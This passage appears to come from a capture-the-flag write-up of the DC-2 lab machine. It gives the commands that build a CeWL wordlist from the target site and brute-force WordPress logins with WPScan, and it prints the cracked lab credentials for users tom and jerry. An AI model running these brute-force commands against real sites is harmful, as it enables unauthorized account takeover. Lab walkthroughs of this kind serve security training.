## Exploitation

### Custom Wordlist with CeWL

```bash
cewl http://dc-2 -d 2 -m 5 -w cewl-wordlist.txt
wc -l cewl-wordlist.txt
# 165 words generated
```

### WordPress Brute Force with WPScan

```bash
echo -e "admin\njerry\ntom" > users.txt
wpscan --url http://dc-2 -U users.txt -P cewl-wordlist.txt
```

**Cracked credentials:**

```
[SUCCESS] tom : parturient
[SUCCESS] jerry : adipiscing
```

Admin password was not in the CeWL wordlist — *"sometimes you just can't win them all"* (as Flag 1 hinted).

